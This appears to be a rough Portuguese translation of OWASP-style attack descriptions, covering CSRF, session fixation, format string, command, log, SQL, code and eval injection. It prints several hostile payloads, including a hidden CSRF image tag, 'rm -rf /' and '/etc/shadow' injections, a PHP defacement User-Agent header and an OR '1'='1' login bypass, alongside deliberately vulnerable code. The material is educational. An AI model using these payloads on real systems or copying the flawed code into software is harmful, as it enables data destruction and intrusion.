+Supondo que Alice é autenticado com a aplicação, quando ela clica no link, a transferência de US $ 100.000 para a conta de Maria ocorrerá. No entanto, Maria percebe que Alice clica no link, em seguida, Alice vai notar que ocorreu uma transferência. Portanto, Maria decide esconder o ataque em uma imagem de zero bytes:
+
+
+<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="1" height="1" border="0">
+
+
+Se esta tag de imagem foi incluída no e-mail, Alice só vê uma pequena caixa que indica que o navegador não poderia processar a imagem. No entanto, o navegador ainda vai submeter o pedido à bank.com sem qualquer indicação visual de que a transferência ocorreu.
+
+
+Controles Relacionados ~
+
+* Adicione uso único por solicitação de URL e todas as formas para além da sessão padrão. Isto também é designado por "teclas de forma". Muitos frameworks (ex, Drupal.org 4.7.4 +) têm ou estão começando a incluir este tipo de proteção "built-in" de todas as formas para que o programador não precisa codificar essa proteção manualmente.
+* TBD: Adicionar um nonce por sessão a URL e todas as formas
+* TBD: Adicionar um hash (id da sessão, nome da função, segredo do lado do servidor) a URL e todas as formas
+* TBD:. NET - identificador de sessão extra para ViewState com MAC
+* Verificar a referência na solicitação HTTP do cliente vai evitar ataques CSRF. Ao assegurar que a solicitação HTTP vieram do site original significa que os ataques de outros sites não funcionarão. É muito comum ver referrer cheques utilizados em hardware de rede incorporado devido a limitações de memória. XSS pode ser usado para contornar tanto referrer e verificações baseada em tokens simultaneamente. Por exemplo, o Worm Sammy usou um XHR para obter o token CSRF para forjar solicitações.
+* "Apesar de cross-site request forgery é, fundamentalmente, um problema com a aplicação web, e não o usuário, os usuários podem ajudar a proteger as suas contas em sites mal projetados por logoff do site antes de visitar o outro, ou limpar os cookies do seu navegador, no final de cada sessão do navegador. "-http :/ / en.wikipedia.org / wiki / Cross-site_request_forgery # _Observação-1
+* Tokenização
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Fixação de Sessão
+
+Descrição
+
+Fixação de sessão é um ataque que permite a um atacante roubar uma sessão de usuário válido. O ataque explora uma limitação na forma como a aplicação web gerencia o ID da sessão, mais especificamente a aplicação web vulnerável. Quando a autenticação de um utilizador, não atribui uma nova sessão de identificação, tornando possível a utilização de um ID da sessão existente. O ataque consiste na indução de um utilizador para autenticar-se com uma identificação da sessão conhecida, e depois sequestrar a sessão do utilizador validado pelo conhecimento da ID da sessão utilizada. O atacante tem de fornecer um legítimo Web ID da sessão do aplicativo e tentar fazer com que o navegador da vítima usá-lo.
+
+O ataque de fixação de sessão é uma classe de Sequestro de sessão (hijacking), que rouba a sessão estabelecida entre o cliente e o servidor Web depois que o usuário fizer dentro. Ao invés disso, o ataque de fixação de sessão corrige uma sessão estabelecida no navegador da vítima, de modo que o ataque começa antes do usuário fizer login
+Existem várias técnicas para executar o ataque, isso depende de como os negócios de aplicativos Web com tokens de sessão. Abaixo estão algumas das técnicas mais comuns:
+• token de sessão no argumento URL: O ID da sessão é enviada para a vítima em um hiperlink ea vítima acessa o site através da URL maliciosa.
+• token de sessão em um campo de formulário oculto: Neste método, a vítima deve ser levado para autenticar no servidor Web de destino, utilizando um formulário de login desenvolvido para o atacante. O formulário pode ser hospedado no servidor web mal ou diretamente no html formatado e-mail.
+• ID da sessão em um cookie:
+
+o script do lado do cliente
+A maioria dos navegadores suportam a execução de scripts do lado do cliente. Neste caso, o agressor pode usar ataques de injeção de código como o ataque XSS (Cross-site scripting) para inserir um código malicioso no link enviado para a vítima e corrigir um ID de sessão no seu cookie. Usando a função de Document, o navegador que executa o comando torna-se capaz de fixar valores dentro do cookie que ele irá usar para manter uma sessão entre o cliente e o Web Application.
+o <META> tag
+Tag <META> também é considerado um ataque de injeção de código, no entanto, diferente do ataque XSS, onde os scripts indesejáveis ​​pode ser desativado, ou a execução pode ser negado. O ataque utilizando este método torna-se muito mais eficiente, porque é impossível desabilitar o processamento dessas tags em todos os navegadores.
+o cabeçalho de resposta HTTP
+Este método explora a resposta do servidor para corrigir o ID da sessão no navegador da vítima. Incluindo o parâmetro Set-Cookie na resposta cabeçalho HTTP, o atacante é capaz de inserir o valor do ID da sessão no cookie e envia para o navegador da vítima.
+
+Figura 1. Exemplo simples de um ataque Fixação de Sessão. - https://www.owasp.org/images/9/9c/Fixation.jpg
+Figura 2. Set-Cookie na resposta do cabeçalho HTTP. - https://www.owasp.org/images/e/ed/Fixation2.jpg
+
+Exemplos
+
+Exemplo 1 ~
+O exemplo seguinte explica uma forma simples, o processo de ataque, e os resultados esperados.
+(1) O atacante tem que estabelecer uma conexão legítima com o servidor web que (2) emite um ID de sessão ou, o atacante pode criar uma nova sessão com o ID da sessão proposta, então, (3), o atacante tem que enviar um link com o ID da sessão estabelecida para a vítima, ela tem que clicar no link enviado pelo atacante acessar o site (4), o Servidor web vi que sessão já foi estabelecido e um novo não precisa ser criado, (5) a vítima fornece suas credenciais para o servidor web (6), sabendo que o ID da sessão, o atacante pode acessar a conta do usuário.
+
+Exemplo 2 ~
+Cabeçalho de resposta HTTP
+A inserção do valor da SessionID no cookie manipula e a resposta do servidor pode ser feita, interceptando os pacotes trocados entre o cliente e o aplicativo da Web inserindo o parâmetro Set-Cookie.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Formato de ataque sequencial
+
+Descrição
+
+ O exploit do Formato de Ataque Sequencial ocorre quando os dados apresentados de uma cadeia (sequencia) de entrada é avaliada como um comando da aplicação. Desta forma, o atacante pode executar código, leia a pilha, ou causar uma falha de segmentação no aplicativo em execução, provocando novos comportamentos que possam comprometer a segurança ou a estabilidade do sistema.
+ Para entender o ataque, é necessário compreender os componentes que o constituem.
+• A função Format é uma função de conversão de ANSI C, como printf, fprintf, que converte uma variável primitiva da linguagem de programação em uma representação string legível.
+• O formato de String é o argumento da função Format e é uma string Z ASCII que contém os parâmetros de texto e formato, como: printf ("O número mágico é:% d \ n", 1911);
+• O parâmetro string de formato, como% x% s define o tipo de conversão da função de formatação.
+
+O ataque pode ser executado quando o aplicativo não valido valida corretamente a entrada submetida. Neste caso, se um parâmetro de string de formato, como x%, é inserido nos dados postados, a seqüência é analisada pela função Format e a conversão especificada nos parâmetros é executada. No entanto, a função de formatação está esperando mais argumentos como entrada, e se esses argumentos não são fornecidos, a função poderia ler ou escrever na pilha.
+Desta forma, é possível definir uma entrada bem trabalhada que poderia mudar o comportamento da função de formatação, permitindo que o atacante cause negação de serviço ou executar comandos arbitrários.
+Se o aplicativo usa funções de formato de código-fonte, que é capaz de interpretar os caracteres de formatação, o invasor pode explorar a vulnerabilidade através da inserção de caracteres de formatação em um formulário do site. Por exemplo, se a função printf é usada para mostrar o nome de usuário inserido em alguns campos da página, o site pode estar vulnerável a este tipo de ataque, como mostrado abaixo:
+
+
+printf (userName);
+
+
+A seguir estão alguns exemplos de funções de formato, que se não tratados, podem expor a aplicação a Cadeia Ataque Format.
+
+Tabela 1. 
+
+Funções		formato
+
+fprint 		Escreve o printf para um arquivo
+printf 		Tira uma string formatada
+sprintf 	Printa em uma string
+snprintf	Printa uma seqüência de verificar o comprimento
+vfprintf 	Imprime a uma estrutura va_arg para um arquivo
+vprintf 	Imprime a estrutura va_arg para stdout
+vsprintf 	Imprime o va_arg para uma string
+vsnprintf 	Imprime o va_arg para uma string verificar o comprimento
+
+
+Abaixo estão alguns parâmetros de formato que podem ser usados e as suas consequências:
+
+• "% x" ler os dados da pilha
+• "% s" Leia cadeias de caracteres a partir da memória do processo
+• "% n" Escreva um inteiro para locais na memória do processo
+
+Para descobrir se o aplicativo é vulnerável a este tipo de ataque, é necessário verificar se a função de formatação aceita analisa os parâmetros de cadeia de formato mostrados na tabela 2.
+
+Tabela 2. 
+Parâmetros comuns usados​em uma String Ataque Format.
+
+Parâmetros 	Saída 			passado como
+
+%%	        Caracter% (literal) 	referência
+%		 p representação externa de um ponteiro para void Referência
+% 			d Valor Decimal
+% 			c Character
+% 	u valor decimal sem sinal
+% 	x Valor Hexadecimal
+	Referência String% s
+% n escreve o número de caracteres em uma referência de ponteiro
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção de Cáractere Especial Personalizado
+
+Descrição
+
+O software não devidamente filtra ou cita caracteres especiais e palavras reservadas que são usadas em uma língua ou representação personalizada do proprietário, que é usado pelo produto. Isso permite que atacantes possam modificar a sintaxe, conteúdo ou comandos antes de serem processadas pelo sistema final.
+
+Exemplos
+
+Exemplo 1 ~
+Um exemplo simples é uma aplicação que executa quase tudo o que é passado para ele a partir do terminal atual, o usuário sem sanatização bloqueia a entrada do usuário. Se o aplicativo não implementa sinais adequados de manuseio, podemos interromper ou suspender a execução do programa, enviando respectivamente Ctrl + C (^ C) ou Ctrl + Z (^ Z) combinações. Estas combinações estão enviando sinais para a aplicação. No primeiro caso, é SIGINT e no segundo é sinal SIGSTOP.
+
+Exemplo 2 ~
+O exemplo clássico, muitas vezes usado pelos guerreiros / bandidos de IRC, foi desconectar os usuários de modem, enviando a eles uma sequência especial de caracteres. Envio através de qualquer protocolo (IP) "+ + + ATH0" seqüência causou que alguns modems param de interpretar essa seqüência como um comando de desconexão. Então, tudo o que tinha que ser feito foi enviar a seqüência em um canal de IRC, que por efeito força modems vulneráveis à desligar.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção de comando
+
+Descrição
+
+O objectivo do ataque de injeção de comando é injectar e executar comandos especificados pelo intruso na aplicação vulnerável. Em situação como esta, a aplicação, que executa comandos do sistema não desejadas, é como um shell do sistema pseudo, e o atacante pode usá-lo como qualquer usuário do sistema autorizado. No entanto, os comandos são executados com os mesmos privilégios e do ambiente que o aplicativo tenha. Ataques de injeção de comando é possível na maioria dos casos devido à falta de validação de dados de entrada correta, o que pode ser manipulado pelo atacante (formulários, cookies, cabeçalhos HTTP, etc.)
+Existe uma variante do ataque Código de injeção. A diferença com a injeção de código é que o atacante acrescenta o seu próprio código para o código existente. Deste modo, o intruso se estende a funcionalidade padrão de aplicação, sem a necessidade de executar os comandos do sistema. Código injetado é executado com os mesmos privilégios e do ambiente que o aplicativo tenha.
+Um ataque de injeção de comando operacional ocorre quando um invasor tenta executar comandos de sistema através de uma aplicação vulnerável. As candidaturas são considerados vulneráveis ​​ao ataque de injeção de comando OS se utilizar a entrada do usuário em um comando de nível de sistema.
+
+
+Exemplos
+
+Exemplo 1
+O código a seguir é um invólucro em torno do comando cat UNIX que imprime o conteúdo de um arquivo para a saída padrão. Também é injectável:
+
+#include <stdio.h>
+#include <unistd.h>
+
+int main(int argc, char **argv) {
+ char cat[] = "cat ";
+ char *command;
+ size_t commandLength;
+
+ commandLength = strlen(cat) + strlen(argv[1]) + 1;
+ command = (char *) malloc(commandLength);
+ strncpy(command, cat, commandLength);
+ strncat(command, argv[1], (commandLength - strlen(cat)) );
+
+ system(command);
+ return (0);
+}
+
+
+Usado normalmente, a saída é simplesmente o conteúdo do arquivo solicitado:
+
+$ ./catWrapper Story.txt
+When last we left our heroes...
+
+No entanto, se somarmos um ponto e vírgula e outro comando para o final desta linha, o comando é executado pelo catWrapper com nenhuma queixa:
+
+$ ./catWrapper "Story.txt; ls"
+When last we left our heroes...
+Story.txt               doubFree.c              nullpointer.c
+unstosig.c              www*                    a.out*
+format.c                strlen.c                useFree*
+catWrapper*             misnull.c               strlength.c             useFree.c
+commandinjection.c      nodefault.c             trunc.c                 writeWhatWhere.c
+
+Se catWrapper tinha sido programado para ter um nível de privilégio maior do que o usuário padrão, comandos arbitrários podem ser executados com o maior privilégio.
+
+
+Exemplo 2
+O seguinte programa simples aceita um nome de arquivo como um argumento de linha de comando, e exibe o conteúdo do arquivo de volta para o usuário. O programa é instalado setuid root, porque se destina a uso como uma ferramenta de aprendizagem para permitir que os administradores de sistema in-formação para inspecionar os arquivos do sistema privilegiadas sem dar-lhes a capacidade de modificá-los ou danificar o sistema.
+
+int main(char* argc, char** argv) {
+               char cmd[CMD_MAX] = "/usr/bin/cat ";
+               strcat(cmd, argv[1]);
+               system(cmd);
+       }
+
+Porque o programa é executado com privilégios de root, a chamada system () também executa com privilégios de root. Se um usuário especifica um nome de arquivo padrão, a chamada funciona como o esperado. No entanto, se um atacante passa por uma cadeia de caracteres do formulário "; rm-rf /", então a chamada de system () não consegue executar o gato, devido à falta de argumentos e arados para apagar recursivamente o conteúdo da partição raiz.
+
+
+Exemplo 3
+O seguinte código de um programa privilegiado usa a variável de ambiente $ APPHOME para determinar o diretório de instalação do aplicativo, e, em seguida, executa um script de inicialização nesse diretório.
+
+ ...
+       char* home=getenv("APPHOME");
+       char* cmd=(char*)malloc(strlen(home)+strlen(INITCMD));
+       if (cmd) {
+               strcpy(cmd,home);
+               strcat(cmd,INITCMD);
+               execl(cmd, NULL);
+       }
+       ...
+
+Como no Exemplo 2, o código deste exemplo permite que um invasor execute comandos arbitrários com os privilégios elevados da aplicação. Neste exemplo, o atacante pode modificar a variável de ambiente $ APPHOME para especificar um caminho diferente, contendo uma versão maliciosa de INITCMD. Porque o programa não valida o valor lido a partir do ambiente, controlando a variável de ambiente, o atacante pode enganar o aplicativo em execução de código malicioso.
+O atacante é variável usando o ambiente para controlar o comando que o programa chama, de modo que o efeito do meio ambiente está expressa neste exemplo. Vamos agora voltar nossa atenção para o que pode acontecer quando o atacante muda a forma como o comando é interpretado.
+
+Exemplo 4
+O código abaixo é de um utilitário baseado na web CGI que permite que os usuários alterem suas senhas. O processo de atualização de senha sob NIS inclui executar o make no diretório / var / yp diretório. Note-se que desde que o programa atualiza os registros de senhas, que foi instalado com setuid root.
+O programa invoca fazer como se segue:
+
+system("cd /var/yp && make &> /dev/null");
+
+Ao contrário dos exemplos anteriores, o comando neste exemplo é codificado, de modo que um atacante não pode controlar o argumento passado para system (). No entanto, desde que o programa não especifica um caminho absoluto para fazer, e não esfregar as variáveis ​​de ambiente antes de chamar o comando, o atacante pode modificar sua variável $ PATH para apontar para um binário malicioso chamado fazer e executar o script CGI a partir de um janela de comandos. E desde que o programa foi instalado com setuid root, a versão do atacante de fazer agora é executado com privilégios de root.
+O meio ambiente desempenha um papel importante na execução de comandos do sistema dentro dos programas. Funções como system () e exec () usar o ambiente do programa que os chama, e, portanto, os atacantes têm uma oportunidade potencial para influenciar o comportamento dessas chamadas.
+Existem muitos sites que lhe dirá que Runtime.exec do Java é exatamente o mesmo que a função do sistema de C. Isto não é verdade. Ambos permitem que você invocar um novo programa / processo. No entanto, a função do sistema de C passa seus argumentos para o shell (/ bin / sh) para ser analisado, enquanto Runtime.exec tenta dividir a string em um array de palavras, em seguida, executa a primeira palavra na matriz com o resto das palavras como parâmetros. Runtime.exec não tenta invocar o shell em qualquer ponto. A principal diferença é que grande parte da funcionalidade fornecida pelo shell que poderia ser usado para o mal (o encadeamento de comandos usando o "&", "&&", "|", "| |", etc, redirecionamento de entrada e saída) seria simplesmente acabar como um parâmetro que está sendo passado para o primeiro comando, e, provavelmente, causando um erro de sintaxe, ou ser jogado fora como um parâmetro inválido.
+
+Exemplo 5
+
+Os seguintes trechos de código triviais são vulneráveis​a OS comando injeção na plataforma Unix / Linux:
+C:
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+     char command[256];
+
+     if(argc != 2) {
+          printf("Error: Please enter a program to time!\n");
+          return -1;
+     }
+
+     memset(&command, 0, sizeof(command));
+
+     strcat(command, "time ./");
+     strcat(command, argv[1]);
+
+     system(command);
+     return 0;
+}
+
+
+* Se este fosse um binário suid, considere o caso quando um atacante entra o seguinte: 'ls; cat / etc / shadow'. No ambiente Unix, comandos shell são separados por um ponto e vírgula. Agora podemos executar comandos do sistema à vontade!
+* Java:
+
+Existem muitos sites que lhe dirá que Runtime.exec do Java é exatamente o mesmo que a função do sistema de C. Isto não é verdade. Ambos permitem que você invocar um novo programa / processo. No entanto, a função do sistema de C passa seus argumentos para o shell (/ bin / sh) para ser analisado, enquanto Runtime.exec tenta dividir a string em um array de palavras, em seguida, executa a primeira palavra na matriz com o resto das palavras como parâmetros. Runtime.exec não tenta invocar o shell em qualquer ponto. A principal diferença é que grande parte da funcionalidade fornecida pelo shell que poderia ser usado para o mal (o encadeamento de comandos usando o "&", "&&", "|", "| |", etc, redirecionamento de entrada e saída) seria simplesmente acabar como um parâmetro que está sendo passado para o primeiro comando, e, provavelmente, causando um erro de sintaxe, ou ser jogado fora como um parâmetro inválido.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção de elemento especial
+
+Descrição
+
+A Injeção elemento especial é um tipo de ataque de injeção que explora a fraqueza relacionada a palavras reservadas e caracteres especiais.
+Toda linguagem de programação e sistema operacional tem caracteres especiais consideradas palavras reservadas para isso. No entanto, quando uma aplicação recebe dados como entrada do usuário, é possível observar um comportamento inesperado na aplicação ao analisar esta informação. Isso pode levar à divulgação de informações, controle de acesso e autorização de bypass, a injeção de código, e muitas outras variantes.
+De acordo com os caracteres utilizados, o ataque de injeção elemento especial pode ser realizado utilizando símbolos macro, parâmetro delimitador e caracteres nulos / bytes nulos, entre outros.
+
+Exemplos
+
+Exemplo 1 - O símbolo Macro ~
+O ataque de injeção elemento especial baseada em símbolos macro pode ser realizada através da inserção de símbolos de macro em campos de entrada ou arquivos de configuração do usuário. Um exemplo conhecido de este ataque pode ser representado pela exploração vulnerabilidade terremoto no servidor II, 3,20 e 3,21. Esta vulnerabilidade permite que um usuário remoto possa acessar as variáveis​do console do servidor (cvar), listas de diretório e executar comandos de administração por um cliente sobre o Quake II Server.
+Nesta aplicação, cvars são usados ​​pelo cliente e servidor para armazenar informações de configuração e status. A cvar pode ser acessado por "$ name" sintaxe, onde "nome" é o nome da variável a ser expandido console.
+No entanto, é possível modificar o console do cliente para enviar um comando malicioso para o servidor, como "dizer $ rcon_password" para tentar descobrir o servidor de conteúdo variáveis ​​$ rcon_password.
+Ao descobrir a senha, é possível realizar outras ações no servidor, como a descoberta de estruturas de diretórios, execução de comandos e visualização do conteúdo do arquivo.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção de Entrada
+
+Descrição
+
+Problemas de Injeção de Entrada são um subconjunto do problema de injeção, em que as entradas inválidas tomadas de entrada do usuário são inseridas em toras ou trilhas de auditoria, permitindo que um invasor engane administradores e/ou vestígios de cobertura de ataque. Injeção de Entrada às vezes também pode ser usado para atacar sistemas de monitoramento de entrada  indiretamente através da injeção de dados que os sistemas de monitoramento vai interpretam mal.
+
+Consequências
+- Integridade: Logs suscetíveis a injeção não podem ser confiáveis para fins de diagnóstico ou de prova em caso de um ataque a outras partes do sistema.
+- Controle de acesso: Injeção de Entrada pode permitir ataques indiretos sobre os sistemas que monitoram o log (as entradas).
+
+
+Período de exposição
+- Projeto: Pode ser possível encontrar métodos alternativos para satisfazer os requisitos funcionais de permitir a entrada externa a ser registrada.
+- Implementação: A exposição para este problema é limitada quase que exclusivamente para o tempo de implementação. Qualquer linguagem ou plataforma está sujeita a esta falha.
+
+Plataforma
+- Linguagem: Todas
+- Plataforma: Todas
+
+Recursos necessários
+
+Todos
+
+
+Severidade
+
+Alta
+
+
+Probabilidade de exploit
+
+Muito alta
+
+
+Ataques de injeção de entrada podem ser usados para cobrir as entradas de log ou inserir entradas enganosas. Ataques comuns em registros incluem a inserção de entradas adicionais com informações falsas, truncando entradas para causar a perda de informações ou o uso de caracteres de controle para esconder as entradas de alguns visualizadores de arquivos.
+A maneira mais eficaz para deter esse tipo de ataque é garantir que qualquer entrada externa sendo registrada adere a regras estritas sobre o que os personagens são aceitáveis. Como sempre, a verificação de estilo lista-branca é de longe mais Exemplos
+
+O código a seguir é um trecho de Python simples que grava uma entrada de entrada para um arquivo. Não filtrar conteúdo do log, preferível a verificação estilo lista-negra:
+
+
+def log_failed_login(username)
+ log = open("access.log", �a')
+ log.write("User login failed for: %s\n" % username)
+ log.close()
+
+
+Saída do arquivo de log normal se parece com:
+
+
+User login failed for: guest
+User login failed for: admin
+
+
+No entanto, se passarmos o seguinte como o nome de usuário:
+
+guest\nUser login succeeded for: admin
+
+o log, ao invés, têm as entradas enganosas:
+
+
+User login failed for: guest
+User login succeeded for: admin
+
+Se esperava-se que o registro estava indo para ser visto a partir de um shell de comando (como é frequentemente o caso com o software de servidor) que pode injetar caracteres de controle do terminal para fazer com que a tela faça backup de linhas ou entradas de registro apagando de vista. Fazer isso na verdade não remover as entradas do arquivo, mas pode evitar inspeção informal de perceber as entradas de log críticos de segurança.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção de Recurso
+
+Descrição
+
+Este ataque consiste em mudar identificadores de recursos usados​por um aplicativo, a fim de executar uma tarefa mal-intencionada. Quando uma aplicação que permite a entrada do usuário para definir um recurso, como um nome de arquivo ou número da porta, estes dados podem ser manipulados para executar ou acessar diferentes recursos.
+A fim de ser devidamente executado, o invasor deve ter a possibilidade de especificar um identificador de recurso através do formulário de inscrição e a aplicação deve permitir a sua execução.
+O tipo de recurso afetado pela entrada do usuário indica o tipo de conteúdo que pode ser exposto. Por exemplo, um aplicativo que permite a entrada de caracteres especiais, como ponto, barra e a arrab invertida é arriscado quando usado em métodos que interagem com o sistema de arquivos.
+O ataque de injeção de recursos se concentra em acessar outros recursos do que o sistema de arquivos local, que é uma técnica de ataque diferente, conhecida como um ataque de Manipulação de Caminho. 
+
+Exemplos
+
+Exemplo 1 ~
+Os exemplos a seguir representam uma aplicação que recebe um número de porta de uma solicitação HTTP e cria um socket com este número de porta sem qualquer validação. Um usuário usando um proxy pode modificar esta porta e obter uma conexão direta (socket) com o servidor. Código JAVA:
+
+
+String rPort = request.getParameter("remotePort");
+...
+ServerSocket srvr = new ServerSocket(rPort);
+Socket skt = srvr.accept(); 
+...
+
+
+
+Código .NET:
+
+
+int rPort = Int32.Parse(Request.get_Item("remotePort "));
+...
+IPEndPoint endpoint = new IPEndPoint(address,rPort);
+socket = new Socket(endpoint.AddressFamily, 
+SocketType.Stream, ProtocolType.Tcp);
+socket.Connect(endpoint);
+...
+
+
+Exemplo 2 ~
+Este exemplo é o mesmo do anterior, mas torna-se o número da porta de pedidos CGI usando C + +:
+
+
+char* rPort = getenv("remotePort ");
+...
+serv_addr.sin_port = htons(atoi(rPort));
+if (connect(sockfd,&serv_addr,sizeof(serv_addr)) < 0) 
+error("ERROR connecting");
+...
+
+
+
+Exemplo 3
+Este exemplo em PLSQL / TSQL recebe um caminho de URL de um CGI e faz o download do arquivo contido nele. Se um usuário modifica o caminho ou nome do arquivo, é possível fazer o download de arquivos arbitrários do servidor:
+
+
+...
+filename := SUBSTR(OWA_UTIL.get_cgi_env('PATH_INFO'), 2);
+WPG_DOCLOAD.download_file(filename); 
+...
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção de SQL 
+
+Visão Geral
+
+Um ataque de injeção SQL consiste na inserção ou "injeção" de uma consulta SQL através dos dados de entrada do cliente para a aplicação. Um exploit de injeção SQL de sucesso pode ler dados sensíveis do banco de dados, modificar os dados do banco de dados (Insert / Update / Delete), executar operações de administração do banco de dados (como desligar o DBMS), recuperar o conteúdo de um determinado arquivo presente no arquivo DBMS do sistema e, em alguns casos emitir comandos para o sistema operativo. Ataques de injeção de SQL são um tipo de ataque de injeção, no qual comandos SQL são injetados na entrada do plano de dados, a fim de efetuar a execução de comandos SQL predefinidas.
+
+Modelagem de Ameaças
+
+- Ataques de injeção SQL permitem que os atacantes de identidade falsifiquem, adulterem dados existentes, causando problemas de repúdio, como anular transações ou alterar os saldos, permitindo a divulgação completa de todos os dados no sistema, destruir os dados ou torná-lo disponível, e tornar-se administradores do servidor de banco de dados.
+- Injeção de SQL é muito comum com aplicações PHP e ASP, devido à prevalência de interfaces funcionais mais velhos. Devido à natureza de interfaces de programação disponíveis, aplicações J2EE e ASP.NET são menos propensos a ter facilmente exploração a injeções de SQL.
+- A gravidade dos ataques de injeção de SQL é limitado pela habilidade do atacante e imaginação, e, em menor medida, a defesa em profundidade contramedidas, como baixas conexões de privilégio para o servidor de banco de dados e assim por diante. Em geral, consideram SQL Injection a gravidade de alto impacto.
+
+Erros de injeção SQL ocorrem quando:
+
+Dados entram em um programa de uma fonte não confiável.
+Os dados utilizados para construir dinamicamente uma consulta SQL
+
+
+As principais conseqüências são:
+Confidencialidade: Uma vez que os bancos de dados SQL, geralmente armazenam dados sensíveis, perda de confidencialidade é um problema freqüente com as vulnerabilidades de injeção SQL.
+Autenticação: Se os comandos SQL pobres são usados ​​para verificar nomes de usuário e senhas, é possível se conectar a um sistema como outro usuário sem conhecimento prévio da senha.
+Autorização: Se as informações de autorização é realizada em um banco de dados SQL, pode ser possível alterar essas informações por meio da exploração bem sucedida de uma vulnerabilidade de injeção SQL.
+Integridade: Assim como é possível ler informações sensíveis, também é possível fazer alterações ou mesmo excluir essas informações com um ataque de injeção SQL.
+
+Exemplos
+
+Exemplo 1 ~
+Em SQL:
+
+
+select id, firstname, lastname from authors
+
+
+Se a pessoa, desde que:
+
+
+Firstname: evil'ex
+Lastname: Newman
+
+
+a cadeia de consulta vira:
+
+select id, firstname, lastname from authors where forename = 'evil'ex' and surname ='newman'
+
+que o banco de dados tenta executar como:
+
+Incorrect syntax near il' as the database tried to execute evil. 
+
+A versão segura da instrução SQL acima poderia ser codificado em Java como:
+
+
+
+String firstname = req.getParameter("firstname");
+String lastname = req.getParameter("lastname");
+// FIXME: do your own validation to detect attacks
+String query = "SELECT id, firstname, lastname FROM authors WHERE forename = ? and surname = ?";
+PreparedStatement pstmt = connection.prepareStatement( query );
+pstmt.setString( 1, firstname );
+pstmt.setString( 2, lastname );
+try
+{
+	ResultSet results = pstmt.execute( );
+}
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção Direta de Código Estático
+
+Descrição
+
+Uma IDdCE (Injeção Direta de Código Estático) consiste em injetar código diretamente no recurso utilizado pela aplicação durante o processamento de uma solicitação do usuário. Isto é normalmente realizado por adulteração de bibliotecas e arquivos de modelo que são criadas com base na entrada do usuário sem sanitização de dados adequada. Após a solicitação do usuário ao recurso modificado, as ações definidas no que vai ser executado no lado do servidor no contexto do processo do servidor web.
+Lado do servidor é considerado um tipo de injeção de código estático direta. Ele não deve ser confundido com outros tipos de injeção de código, como XSS ("Cross-site scripting" ou "injeção HTML"), onde o código é executado no lado do cliente.
+
+Exemplos
+
+Exemplo 1 ~
+Este é um simples exemplo de exploração de uma vulnerabilidade csSearch 2,3 CGISCRIPT.NET, publicada em Bugtraq ID: 4368. Ao solicitar o seguinte URL para o servidor, é possível executar comandos definidos no """"configuração" variável.
+
+
+csSearch.cgi?command=savesetup&setup=PERL_CODE_HERE
+
+
+
+Para o clássico exemplo, o seguinte comando pode ser usado para remover todos os arquivos de "/" pasta:? Comando csSearch.cgi = savesetup e configuração = `rm-rf% 20% 20 /`
+Note-se que o comando acima deve ser codificado para ser aceito.
+
+Exemplo 2 ~
+Este exemplo explora uma vulnerabilidade no Ultimate PHP Board (UPB) 1.9 (CVE-2003-0395), que permite a um invasor executar um código php aleatório. Isso acontece porque algumas variáveis ​​do usuário, como endereço IP e User-Agent, são armazenadas em um arquivo que é usado pela página admin_iplog.php para mostrar as estatísticas do usuário. Quando um administrador navega por esta página, o código injetado anteriormente por um pedido malicioso é executado. O exemplo a seguir armazena um código PHP malicioso que irá desfigurar a página index.html quando um administrador navega admin_iplog.php.
+
+
+
+GET /board/index.php HTTP/1.0
+User-Agent: <? system( "echo \'hacked\' > ../index.html" ); ?>
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Avaliação dinâmica de código direto ('Injeção Eval')
+
+Descrição
+
+Este ataque consiste em um roteiro que não valida corretamente as entradas de usuário no parâmetro da página. Um usuário remoto pode fornecer uma URL especialmente criada para passar um código arbitrário que seja de uma instrução eval (), o que resulta na execução de código.
+Nota 1: Este ataque vai executar o código com a mesma permissão como o serviço web de destino, incluindo os comandos do sistema de operação.
+Nota 2: injeção Eval é prevalente em manipulador / procedimentos que podem querer invocar um grande número de funções de envio, ou definir um grande número de variáveis​​.
+
+Exemplos
+
+Exemplo 1 ~
+Neste exemplo, um atacante pode controlar todo ou parte de uma cadeia de entrada que é alimentado em uma eval () chamada de função:
+
+
+$myvar = "varname"; 
+  $x = $_GET['arg']; 
+  eval("\$myvar = \$x;"); 
+
+
+O argumento do "eval" será processado como PHP, então comandos adicionais podem ser acrescentados. Por exemplo, se "arg" é definido como "10; system (\" / bin / echo uh-oh \ ");", código adicional é de gerência que executa um programa no servidor, neste caso "/ bin / echo ".
+
+Exemplo 2 ~
+O seguinte é um exemplo de SQL Injection. Considere-se uma página web que tem dois campos para permitir que os usuários digitem um nome de usuário e uma senha. O código por trás da página irá gerar uma consulta SQL para verificar a senha com a lista de nomes de usuário:
+
+
+SELECT UserList.Username
+FROM UserList
+WHERE
+UserList.Username = 'Username'
+AND UserList.Password = 'Password'
+
+
+Se essa consulta retorna exatamente uma linha, então o acesso é concedido. No entanto, se um usuário mal-intencionado entra com um nome de usuário válido e injeta um código válido ("'OR 1 = 1") no campo Senha, em seguida, a consulta resultante será parecido com esta:
+
+
+
+SELECT UserList.Username
+FROM UserList
+WHERE
+UserList.Username = 'Username'
+AND UserList.Password = 'Password' OR '1'='1'
+
+
+No exemplo acima, "palavra-passe" é assumido ser branco ou alguma cadeia inócua. "1 = 1" será sempre verdadeiro e muitas linhas será devolvidas, permitindo assim o acesso. A vírgula invertida final será ignorado pelo parser SQL. A técnica pode ser refinado para permitir que várias instruções para ser executado, ou mesmo para carregar e executar programas externos.
+
+Exemplo 3 ~
+Este é um exemplo de um arquivo que foi injetado. Considere este programa PHP (que inclui um arquivo especificado pelo pedido):
+
+
+
+<?php
+   $color = 'blue';
+   if ( isset( $_GET['COLOR'] ) )
+      $color = $_GET['COLOR'];
+   require( $color . '.php' );
+?>
+<form>
+   <select name="COLOR">
+      <option value="red">red</option>
